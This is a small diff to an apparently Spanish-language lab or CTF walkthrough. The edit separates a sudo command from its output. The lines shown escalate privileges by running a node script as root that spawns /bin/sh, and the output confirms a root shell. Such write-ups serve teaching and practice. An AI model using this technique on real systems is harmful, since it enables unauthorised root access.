@@ -162,7 +162,8 @@ mario@014bc8cff695:~$ echo 'require("child_process").spawn("/bin/sh", {stdio: [0
 Y ejecutamos el comando con sudo:
 
 ```bash
-$ sudo /usr/bin/node /home/mario/script.js# whoami;hostname;date
+$ sudo /usr/bin/node /home/mario/script.js
+# whoami;hostname;date
 root
 014bc8cff695
 Fri Jul  5 21:14:24 UTC 2024
